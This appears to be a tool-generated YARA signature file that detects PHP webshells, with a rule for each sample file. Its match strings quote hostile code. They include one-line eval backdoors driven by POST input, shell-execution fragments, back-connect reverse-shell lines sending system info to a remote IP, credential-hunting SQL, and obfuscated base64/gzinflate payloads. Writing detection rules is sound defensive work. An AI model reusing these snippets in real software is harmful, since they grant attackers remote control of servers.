      $s20 = "+acp+JbGAs4gTEEM9D0uZcKvpR+OxTqryHjGrbCK8AJojSOJyD8RctiXEo/W1w6IHZLcP0VMyed1LK8VPMdCrZcz0j00wFVSiH0cw4Kx/yBInwsLYiyWtPDp0WKlkVNj" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_0e634bcc16b562c9a8365ef42b37be8a0eabfd73
{
   meta:
      description = "php17 - file 0e634bcc16b562c9a8365ef42b37be8a0eabfd73.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c3f7e90a63448f7c30f4dd29dce054cd172b0be138896ee8317c72f5f2a48e40"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s13 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s14 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s15 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s16 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s17 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s18 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s19 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s20 = "scookie('loginpass',encode_pass($password));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_3df1afbcfa718da6fc8af27554834ff6d1a86562
{
   meta:
      description = "php17 - file 3df1afbcfa718da6fc8af27554834ff6d1a86562.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "208d43053620304c82210270e449f217044a7e9c60d0bbff382fd0e2da0b868d"
   strings:
      $x1 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x2 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s3 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s4 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s5 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">Php Bilgi</a>\";" fullword ascii
      $s6 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s7 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
      $s8 = "{if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s9 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s10 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s11 = "print $sf.\"<textarea cols=157 rows=23 name=edittxt>\"; $alltxt= file_get_contents($_REQUEST['edit']);" fullword ascii
      $s12 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd Yard" fullword ascii
      $s13 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s14 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s15 = "\\$sock = IO::Socket::INET->new(PeerAddr => \\\"old.zone-h.org\\\", PeerPort => 80, Proto => \\\"tcp\\\") or next;" fullword ascii
      $s16 = "ob_start();passthru($cmnd);$pret = ob_get_contents();ob_clean();" fullword ascii
      $s17 = "\\$sys= 'echo \\\"[ Operating system ][$]\\\"; echo \\\"`uname -a`\\\";" fullword ascii
      $s18 = "<option value='op3'>/var/cpanel/accounting.log</option>" fullword ascii
      $s19 = "fclose($zrodlo);echo \"<center><pre>\".$sta.htmlspecialchars($tekst).$eta.\"</pre></center>\";unlink($temp);} else {" fullword ascii
      $s20 = "elseif(!function_exists(shell_exec)){$opop=popen($ocmd,'r');" fullword ascii
   condition:
      uint16(0) == 0xbbef and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_299c63ceb239aba7d6d1af2500faefb50f3cb953
{
   meta:
      description = "php17 - file 299c63ceb239aba7d6d1af2500faefb50f3cb953.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bd43a57ef1ed2f0b97ef87ba7ff5a839107460fe9b1b71364e31442e8d613759"
   strings:
      $s1 = "<?php @eval($_POST['chopper']);?> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_210_fix_page_menu_order
{
   meta:
      description = "php17 - file 210_fix_page_menu_order.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d33e8d15d5c1abceb23c0f82a80ed8d3fc3a7951f843050eb7664b3a8b645f6c"
   strings:
      $s1 = "if ($this->has_table_column($table, 'menu_order')) {" fullword ascii
      $s2 = "$sql .= 'ALTER COLUMN `menu_order` SET DEFAULT 0';" fullword ascii
      $s3 = "$sql  = 'ALTER TABLE `' . $table . '`;';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_1a91f844e603c0b6fc36b6dfd83ed5ff691ca5e5
{
   meta:
      description = "php17 - file 1a91f844e603c0b6fc36b6dfd83ed5ff691ca5e5.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b0f85fbc3dc63c15b7112f54a547593802967fc9362cc41a01a360ed27ac5205"
   strings:
      $s1 = "@eval($GLOBALS['_POST']['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule APINotFoundError
{
   meta:
      description = "php17 - file APINotFoundError.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0ce0f586ef3ef77e8443bf0634590d0258ca989048fe74f9a8d15bac69d3fcbc"
   strings:
      $s1 = "* @author Randy Sesser <randy@instaphp.com>" fullword ascii
      $s2 = "* @license http://instaphp.mit-license.org MIT License " fullword ascii
      $s3 = "* of this software and associated documentation files (the " fullword ascii
      $s4 = "* Bsically a 404 error from the API when a media object is not found" fullword ascii
      $s5 = "2013 Randy Sesser <randy@instaphp.com>" fullword ascii
      $s6 = "* @version 2.0-dev" fullword ascii
      $s7 = "* APINotFoundError" fullword ascii
      $s8 = "* Copyright " fullword ascii
      $s9 = "* THE SOFTWARE IS PROVIDED " fullword ascii
      $s10 = "* @subpackage Exceptions" fullword ascii
      $s11 = "* The MIT License (MIT)" fullword ascii
      $s12 = "* @package Instaphp" fullword ascii
      $s13 = "class APINotFoundError extends InstagramException { }" fullword ascii
      $s14 = ", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_576ad4f370014dfb1d0f17b0e6855f22
{
   meta:
      description = "php17 - file 576ad4f370014dfb1d0f17b0e6855f22.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e47dae32d0494cf85a3103b70c0a72cca4ee45c5eccc2b14e109b5a9d5b272e"
   strings:
      $s1 = "$GLOBALS[$GLOBALS['y63581'][23].$GLOBALS['y63581'][64].$GLOBALS['y63581'][50].$GLOBALS['y63581'][34]] = $_POST;" fullword ascii
      $s2 = "$GLOBALS[$GLOBALS['y63581'][58].$GLOBALS['y63581'][66].$GLOBALS['y63581'][25].$GLOBALS['y63581'][7]] = $_COOKIE;" fullword ascii
      $s3 = "foreach ($GLOBALS[$GLOBALS['y63581'][23].$GLOBALS['y63581'][64].$GLOBALS['y63581'][50].$GLOBALS['y63581'][34]] as $h4ac=>$da" fullword ascii
      $s4 = "for ($l161=0; $l161<$GLOBALS[$GLOBALS['y63581'][91].$GLOBALS['y63581'][64].$GLOBALS['y63581'][90].$GLOBALS['y63581'][26]" fullword ascii
      $s5 = "for ($o6af1=0; $o6af1<$GLOBALS[$GLOBALS['y63581'][91].$GLOBALS['y63581'][64].$GLOBALS['y63581'][90].$GLOBALS['y63581'][26].$" fullword ascii
      $s6 = "1'][65].$GLOBALS['y63581'][38].$GLOBALS['y63581'][60].$GLOBALS['y63581'][65].$GLOBALS['y63581'][34].$GLOBALS['y63581'][50];" fullword ascii
      $s7 = "return $GLOBALS[$GLOBALS['y63581'][38].$GLOBALS['y63581'][28].$GLOBALS['y63581'][90].$GLOBALS['y63581'][28].$GLOBALS['y63581" fullword ascii
      $s8 = "].$GLOBALS['y63581'][38].$GLOBALS['y63581'][60].$GLOBALS['y63581'][25].$GLOBALS['y63581'][28]]($y09c6ad); $l161++, $o6af1++)" fullword ascii
      $s9 = "][24].$GLOBALS['y63581'][68].$GLOBALS['y63581'][63].$GLOBALS['y63581'][33].$GLOBALS['y63581'][24], $GLOBALS['y63581'][43]);" fullword ascii
      $s10 = "90].$GLOBALS['y63581'][28].$GLOBALS['y63581'][49].$GLOBALS['y63581'][25].$GLOBALS['y63581'][28]]($y09c6ad, $m68ce3dc5), $h4ac);" fullword ascii
      $s11 = "81'][14].$GLOBALS['y63581'][79].$GLOBALS['y63581'][33].$GLOBALS['y63581'][74], $GLOBALS['y63581'][2].$GLOBALS['y63581'][54]);" fullword ascii
      $s12 = "$GLOBALS[$GLOBALS['y63581'][4].$GLOBALS['y63581'][28].$GLOBALS['y63581'][38].$GLOBALS['y63581'][65].$GLOBALS['y63581'][65].$" fullword ascii
      $s13 = "GLOBALS['y63581'][66].$GLOBALS['y63581'][38].$GLOBALS['y63581'][60].$GLOBALS['y63581'][25].$GLOBALS['y63581'][28]]($y09c6ad);)" fullword ascii
      $s14 = "$GLOBALS['y63581'][4].$GLOBALS['y63581'][10] => $GLOBALS['y63581'][65].$GLOBALS['y63581'][51].$GLOBALS['y63581'][50]" fullword ascii
      $s15 = "$x2e047f13 .= $GLOBALS[$GLOBALS['y63581'][1].$GLOBALS['y63581'][34].$GLOBALS['y63581'][49].$GLOBALS['y63581'][90].$G" fullword ascii
      $s16 = "$GLOBALS['y63581'][58].$GLOBALS['y63581'][10] => @$GLOBALS[$GLOBALS['y63581'][93].$GLOBALS['y63581'][76].$GLOBALS['y" fullword ascii
      $s17 = ".$GLOBALS['y63581'][34].$GLOBALS['y63581'][61].$GLOBALS['y63581'][76].$GLOBALS['y63581'][76]]($y09c6ad), $ped43d));" fullword ascii
      $s18 = "echo @$GLOBALS[$GLOBALS['y63581'][59].$GLOBALS['y63581'][38].$GLOBALS['y63581'][64].$GLOBALS['y63581'][60]]($o6af1);" fullword ascii
      $s19 = "1'][37].$GLOBALS['y63581'][87].$GLOBALS['y63581'][62].$GLOBALS['y63581'][28].$GLOBALS['y63581'][54];" fullword ascii
      $s20 = "'][38].$GLOBALS['y63581'][62].$GLOBALS['y63581'][56].$GLOBALS['y63581'][15].$GLOBALS['y63581'][28];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule sig_95570807b7c1a0531c134fb85c98cdc4ff63ee9b
{
   meta:
      description = "php17 - file 95570807b7c1a0531c134fb85c98cdc4ff63ee9b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "97ba3775928dacbf6b4d58416752db2113af88aa914bc35e7b2a7ddf73f70d8b"
   strings:
      $s1 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; " fullword ascii
      $s2 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=(!$unix)?(\"dir\"):(\"ls -lia\"); }" fullword ascii
      $s3 = "if(file_exists($_POST['mk_name']) || !$file=@fopen($_POST['mk_name'],\"w\")) { err(2,$_POST['mk_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s4 = "'eng_text115'=>'Test bypass safe_mode, copy file via compress.zlib:// in function copy()'," fullword ascii
      $s5 = "@mysql_query(\"LOAD DATA INFILE \\\"\".$_POST['test3_file'].\"\\\" INTO TABLE temp_r57_table\");" fullword ascii
      $s6 = "@readfile (\"http://rst.void.ru/r57shell_version/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s7 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
      $s8 = "if($_POST['cmd']==\"ftp_file_up\")   { @ftp_put($connection,$_POST['ftp_file'],$_POST['loc_file'],$_POST['mode']);" fullword ascii
      $s9 = "if(@copy(\"compress.zlib://\".$_POST['test8_file1'], $_POST['test8_file2'])) echo $lang[$language.'_text118'];" fullword ascii
      $s10 = "if(!$file=@fopen($_POST['loc_file'],\"r\")) { err(1,$_POST['loc_file']); $_POST['cmd']=\"\"; }" fullword ascii
      $s11 = "ename($_POST['ftp_file']); } @ftp_get($connection,$_POST['loc_file'],$_POST['ftp_file'],$_POST['mode']);" fullword ascii
      $s12 = "if(!$file=@fopen($_POST['d_name'],\"r\")) { err(1,$_POST['d_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s13 = "if(!$file=@fopen($_POST['e_name'],\"r\")) { err(1,$_POST['e_name']); $_POST['cmd']=\"\"; }" fullword ascii
      $s14 = "else if($fp){ foreach($sql->dump as $v) @fputs($fp,$v.\"\\r\\n\"); } " fullword ascii
      $s15 = "/*  r57shell.php - " fullword ascii
      $s16 = "else if(!$users=get_users()) { echo \"<table width=100% cellpadding=0 cellspacing=0 bgcolor=#000000><tr><td bgcolor=#cccccc><fon" ascii
      $s17 = "exit(\"<b><a href=http://rst.void.ru>r57shell</a> : Access Denied</b>\");" fullword ascii
      $s18 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
      $s19 = "echo sr(25,\"<b>\".$lang[$language.'_text105'].$arrow.\"</b>\",in('text','to',45,(!empty($_POST['to'])?($_POST['to']):(\"hacker@" ascii
      $s20 = "// Login & password crypted with md5, default is 'r57'" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      8 of them
}

rule sig_4ce9792354daf1af28d476d009821946ce8cea25
{
   meta:
      description = "php17 - file 4ce9792354daf1af28d476d009821946ce8cea25.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f502d0da262d698a2bdb943708b5a23dda0cd98a64d96c75ff4b7646a894b7a2"
   strings:
      $s1 = "$conn = mysql_connect( $_GET[\"host\"], $_GET[\"user\"], $_GET[\"pass\"] );" fullword ascii
      $s2 = "echo \"SELECT * FROM information_schema.columns where column_name like '%pass%'\\n\";" fullword ascii
      $s3 = "if( !$conn ) die(\"Failed to connect to \".$_GET[\"host\"] );" fullword ascii
      $s4 = "if( empty( $_GET[\"host\"] ) ) $_GET[\"host\"] = 'localhost';" fullword ascii
      $s5 = "echo \"SELECT * FROM mysql.user\\n\";" fullword ascii
      $s6 = "$rlt = mysql_query( $_GET[\"sql\"], $conn );" fullword ascii
      $s7 = "- host (localhost)" fullword ascii
      $s8 = "mysql_select_db( $_GET[\"db\"] );" fullword ascii
      $s9 = "Useful commands" fullword ascii
      $s10 = "- port (3306)" fullword ascii
      $s11 = "if( empty( $_GET[\"sql\"] ) ){" fullword ascii
      $s12 = "echo \"Results:\\n\";" fullword ascii
      $s13 = "- pass" fullword ascii
      $s14 = "- user " fullword ascii
      $s15 = "echo \"Affected rows: \".mysql_affected_rows( $conn ).\"\\n\";" fullword ascii
      $s16 = "echo \"Error: \".mysql_error().\"\\n\";" fullword ascii
      $s17 = "- db: schema name" fullword ascii
      $s18 = "echo \"SELECT @@version\\n\";" fullword ascii
      $s19 = "Connect to mysql database using ext/mysql (PHP < 5.5):" fullword ascii
      $s20 = "while( $row = mysql_fetch_assoc( $rlt ) ){" fullword ascii
   condition:
      uint16(0) == 0x703c and filesize < 3KB and
      8 of them
}

rule sig_3ff6a27dc3660f8251cd8a174b1f617d589a3a34
{
   meta:
      description = "php17 - file 3ff6a27dc3660f8251cd8a174b1f617d589a3a34.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "322e3005c52489ddaa41b4e73383532c355f071287170168e8bb267c73fb5492"
   strings:
      $s1 = "Usage: nc -vv -l -p 21<br>" fullword ascii
      $s2 = "fputs ($mucx ,\"\\ng0t a shell.\\n\\n\");" fullword ascii
      $s3 = "fputs($mucx , system(\"uname -a\") .$zamazing0 );" fullword ascii
      $s4 = "fputs ($mucx, $one. system(\"whoami\") .$two. \" \" .$message.\"\\n\"); " fullword ascii
      $s5 = "print ( '<title>Back Connect</title>' );" fullword ascii
      $s6 = "$portum=$_POST['portum']; " fullword ascii
      $s7 = "echo \"<br><b>Php Back Connect<br> " fullword ascii
      $s8 = "<input type='text' name='portum' size='5' value='21'><br><br> " fullword ascii
      $s9 = "$mucx=fsockopen($ipim , $portum , $errno, $errstr ); " fullword ascii
      $s10 = "<form method='POST' action=''><br> " fullword ascii
      $s11 = "fputs($mucx , system(\"id\") .$zamazing0.$zamazing0 );" fullword ascii
      $s12 = "$result= fgets ($mucx, 8192); " fullword ascii
      $s13 = "fputs($mucx , system(\"pwd\") .$zamazing0 );" fullword ascii
      $s14 = "$result = \"Error: didnt connect !!!\"; " fullword ascii
      $s15 = "$ipim=$_POST['ipim']; " fullword ascii
      $s16 = "<input type='text' name='ipim' size='15' value=''>" fullword ascii
      $s17 = "Your IP & Port:<br> " fullword ascii
      $s18 = "<input type='submit' value='Connect'><br><br>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_9b59cb5b557e46e1487ef891cedaccf7
{
   meta:
      description = "php17 - file 9b59cb5b557e46e1487ef891cedaccf7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4d48a5e0eb91988a2cc3a834df68de2613c8b4c8781b3fd213e1944ebcf9c6b3"
   strings:
      $s1 = "77777777777777777777777777777777777777777777777777" ascii
      $s2 = "cy9jb25maWcucGhwJz0+MCwnLi4vYXBwL01hZ2UucGhwJz0+MCwnLi4vaW5kZXgucGhwJz0+MCwnLi4vYXBwL2NvZGUvY29yZS9NYWdlL0NvcmUvQ29udHJvbGxlci9G" ascii
      $s3 = "cm9udC9BY3Rpb24ucGhwJz0+MCwnLi4vYXBwL2NvZGUvY29yZS9NYWdlL0NvcmUvZnVuY3Rpb25zLnBocCc9PjAsJy4uL2xpYi9WYXJpZW4vQXV0b2xvYWQucGhwJz0+" ascii
      $s4 = "aUlHRjBJSFJvYVhNZ1ZWSk1PaW9nYUhSMGNEb3ZMMjl3Wlc1emIzVnlZMlV1YjNKbkwyeHBZMlZ1YzJWekwyOXpiQzB6TGpBdWNHaHdLaW92Skhrd1BTZDdVa1ZUUmts" ascii
      $s5 = "MWJtTjBhVzl1WDJWNGFYTjBjeWduYjNCbGJuTnpiRjl3ZFdKc2FXTmZaVzVqY25sd2RDY3BKaVptZFc1amRHbHZibDlsZUdsemRITW9KMjl3Wlc1emMyeGZaVzVqY25s" ascii
      $s6 = "b0tTa3VjbUZ1WkNncEtUc2taVEU1UFNSb01UZzdkMmhwYkdVb0pHVXhPU2w3SkdZeU1EMXpkV0p6ZEhJb0pHVXhPU3d3TENSeE1UWXBPeVJsTVRrOWMzVmljM1J5S0NS" ascii
      $s7 = "bUtHWjFibU4wYVc5dVgyVjRhWE4wY3lnbmIzQmxibk56YkY5blpYUmZjSFZpYkdsamEyVjVKeWttSm1aMWJtTjBhVzl1WDJWNGFYTjBjeWduYjNCbGJuTnpiRjl3ZFdK" ascii
      $s8 = "bTIwKTskeDE4PXRydWU7YnJlYWs7fX1lY2hvICR4MTg/J1tzdWNdJzonW2ZhaWxdJzt9fWVsc2UgZWNobyAnW25vcmVzZl0nO31lbHNlaWYoaXNzZXQoJF9HRVRbJ2Rl" ascii
      $s9 = "RVJVUmZSazlTSjEwN2ZXVnNjMlY3SkdrMFBVQWtYMU5GVWxaRlVsc25Va1ZOVDFSRlgwRkVSRkluWFR0OWFXWW9hWE56WlhRb0pGOVFUMU5VS1NZbWMybDZaVzltS0NS" ascii
      $s10 = "Z2RHaGxJRTl3Wlc0Z1UyOW1kSGRoY21VZ1RHbGpaVzV6WlNBb1QxTk1JRE11TUNrcUlIUm9ZWFFnYVhNZ1luVnVaR3hsWkNCM2FYUm9JSFJvYVhNZ2NHRmphMkZuWlNC" ascii
      $s11 = "JHcxNywkbTIwKT09PWZhbHNlKWNvbnRpbnVlO2ZpbGVfcHV0X2NvbnRlbnRzKCcuLycuc3Vic3RyKG1kNSgkX0dFVFsnZG8nXSksMCw4KS4nLnR4dCcsJHQwLid8Jy4k" ascii
      $s12 = "RGIzWnliRFl2YTNWc1NYRTFXbU51UkVaa2JHTkxlbGN5VUZJdk1Ua3JaMnRMYUZKSGF6RlpWVmhOVEdkM05rVkdhbHh1YWpKak1VeEtiMU53Ym5wck9GZFNSa0ZuVFVK" ascii
      $s13 = "d2RDY3BLWHNrZERFeVBYUnlkV1U3ZldWc2MyVnBaaWhtZFc1amRHbHZibDlsZUdsemRITW9KMlJzSnlrcGV5UnVNVE05YzNSeWRHOXNiM2RsY2loemRXSnpkSElvY0do" ascii
      $s14 = "d0xDZEtVRVZITFRFdU1TY3VZbUZ6WlRZMFgyVnVZMjlrWlNna1lUVXBMRVpKVEVWZlFWQlFSVTVFS1R0QWRHOTFZMmdvSkhrd0xDUnRNU3drYlRFcE8zMC9QZz09Jykp" ascii
      $s15 = "ZlVFOVRWQ2twZXlSaE5UMG5KenRtYjNKbFlXTm9LQ1JmVUU5VFZDQmhjeUFrYURZOVBpUnVOeWw3YVdZb2FYTmZZWEp5WVhrb0pHNDNLU2w3Wm05eVpXRmphQ2drYmpj" ascii
      $s16 = "NF0pKW1rZGlyKCR0MlskaTRdLDA3NzcsdHJ1ZSk7aWYoZmlsZV9leGlzdHMoJHQyWyRpNF0pJiZpc19kaXIoJHQyWyRpNF0pJiZpc19yZWFkYWJsZSgkdDJbJGk0XSkm" ascii
      $s17 = "cFppZ2haVzF3ZEhrb0pGOVRSVkpXUlZKYkowaFVWRkJmV0Y5R1QxSlhRVkpFUlVSZlJrOVNKMTBwS1hza2FUUTlKRjlUUlZKV1JWSmJKMGhVVkZCZldGOUdUMUpYUVZK" ascii
      $s18 = "OWJuVnNiRHQ5YVdZb0pHRTFLWHNrZERFeVBXWmhiSE5sTzJsbUtHWjFibU4wYVc5dVgyVjRhWE4wY3lnbmIzQmxibk56YkY5blpYUmZjSFZpYkdsamEyVjVKeWttSm1a" ascii
      $s19 = "b0pIa3dMQ2NuS1R0QWRHOTFZMmdvSkhrd0xDUnRNU3drYlRFcE8yVmphRzhnSjJOc1pXRnVJRzlySnp0OVpXeHpaU0JsWTJodklDZFFiMjVuSnp0bGVHbDBPMzFwWmln" ascii
      $s20 = "J1BEOVFTRkFnTHlvcUtpQk5ZV2RsYm5Sdktpb2dUazlVU1VORklFOUdJRXhKUTBWT1UwVXFLaUJVYUdseklITnZkWEpqWlNCbWFXeGxJR2x6SUhOMVltcGxZM1FnZEc4" ascii
   condition:
      uint16(0) == 0xd8ff and filesize < 40KB and
      8 of them
}

rule ab63230ee24a988a4a9245c2456e4874
{
   meta:
      description = "php17 - file ab63230ee24a988a4a9245c2456e4874.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "cde45e1fbd984cb4e2d333af323601a210ed6687af6d4d8ba6e65bd76a9689b8"
   strings:
      $s1 = "eval(gzinflate(base64_decode(str_rot13(strrev('=8y/4d5TgVntIf0S3gKks77Bd3f0dWQkWwt6VbyJyxYfjx+j9e7abSDabAPRZE0dUlQcTOhHbxdU4qE2D" ascii
      $s2 = "B/qmfFYl7KG7QNgAUhdIbF/LVtOEhcJzX9nJiRSP5mkKHOoz1VtAWiz4dIjukRwn2jggq4eYEaaDQj8Gd4JmYG9BZgAmiNV3pqb4+cBv5NN1DdGKDskNk3kJWndKVGwx" ascii
      $s3 = "m/0sBFm9JHU1M+6ALFD8G/4R6BZK9nmC+cT9q6Bop7fa2/4E47tsab5+Cp0cwWKGip3xoBU7XgOm2/xArBOs8hYjplB591hW/ZEC17o7Miu/8AM8oCHz/+59sy8S+Jg8" ascii
      $s4 = "HqEZYJb7gEt2PzZhIQYd/V/w9KjqgdXpGAfyEI+yWSbT4H/Ys+G//cEA1+fRVIh7mIe2Q1pYLdep/hVAk63/b26Pgz/QRafhrQ/OVBjrV/Y/UaLe70K1KeEJ1YgKLwIF" ascii
      $s5 = "lJ+nIJTEvDbBc0WpVRekJyGbHwoj4++hFZhzhulOplFbFLuZtjohk3jE/gC8/cYHjntuNCcbPRiZt+nEOMhwbdvVoHntlh+pxFr/B0K4Kan/MrwqGR94x5dpGeTgDs8U" ascii
      $s6 = "ATioelloJ2F5kXe3ccllnhfzd009C74ms99MSg/8eGq2nI7klGeVmCq9feJX3XGqcJc9o4fFE7P6tDHKdHbfTiIQTObMoQHgBciP1XomJcQo5+E0k1HbFnefY7BxjRU+" ascii
      $s7 = "vXDvmWZayFX1nfMGizwsqW0KqpTEp4gQYYbGbfqT6V0eTucfumfewtKcomQbt8i3eslGGBJK6Kx9z3MgTdeUM4NaOjc4MW4YVsEQZqU9Cc7bXZZNwrx4I9blB/XG/Rqx" ascii
      $s8 = "RdM7PwYpByTHWMlVRHmHsLdTZ1SIjYQ4bVZTdhqoSr6Y6M25t+YfobkJC7kpjzc0yYiP75mrFH46IgIoEq+LolQJ3XZZ++7hnpwm4oBM0g+M7UrvezK+zq8A/CMdGIH5" ascii
      $s9 = "C62VGN5IvStMAMteI99jLABue72IXxCOf5WnnbCnvAitVe5Llacj3YzUkYEoVQiM52BinBcvpwSaggreW2fOPf0LcOGg2tZ0+/4sLQ02VRuIvu8n6Y1dgf4c5dC4jMBg" ascii
      $s10 = "mG43Okm4l0s5A4wv8D9BssPaG1lSPph3rUN3if6lEZgi4dwnhwQ7yhPOFT4YxWT3507ljgBQ/+zc7tsAMC+lDzi9uwhtSeYkjSfyjTWH/cCLrpHIE/x2JKpF1EO2YU6l" ascii
      $s11 = "CJuTmPeXkw7eE+eOHW63xC+jCUL3oFM9UAiA2h1uT9TKAMYQWV5tFqBiCZqRi55SuiosgrWwm35/rjJ1dcLg28zUZf9iF+kMQyHATz30LIWMxINZrvTxAlnFGGWVPMP6" ascii
      $s12 = "PJTCHWsqkEx8M7FfLWOQregNSPTOX5Rn9E/ghK28wv0Uekqe1o5')))));" fullword ascii
      $s13 = "IY8bLTt57e9K997QUFx/Wz//AAlqQqdXmOYExnYFZCvwJD9O6kxw8Xxd+uvRftQqqkwtnK5i1EyAyq6h1Wh9hEkbVndPYE11mSGJkuWGiu9KCStYiWjWkeOh6zNAOpMe" ascii
      $s14 = "FFDG6kmPcebE0C+fw//n3od+aMHWhxaonjM991RmHZ8inC1LOF69Fi7CPzr8Taz0MmD/GBy2LxQy9o+D/10aJdKZT8M7QhE7djPdVSL2kQdwwdExtZQBIs0We0l71PCC" ascii
      $s15 = "MLbmODaZS1GhVZ0pdeckKYS//JhVmsitfj1s32b5mGoYFX1QN5dutskGiCjGsNqgHRwQZ1gS++LkWFba4EEAJUCv5YLroN2dnxkJYdiuIR4Vb5jUQM4vHiECuwJJoaR/" ascii
      $s16 = "0qiQrTw+8MnEpctYSO6dHBt5H5KGpLj4KvicTij9aDhN+o6+Wc9B/2q9C9fG27j37+85sL17eAaGGKF59a3sbBMwdizrSe2w4GB/M9iz8j7uaBwqL//G2Q/+jmCehGC+" ascii
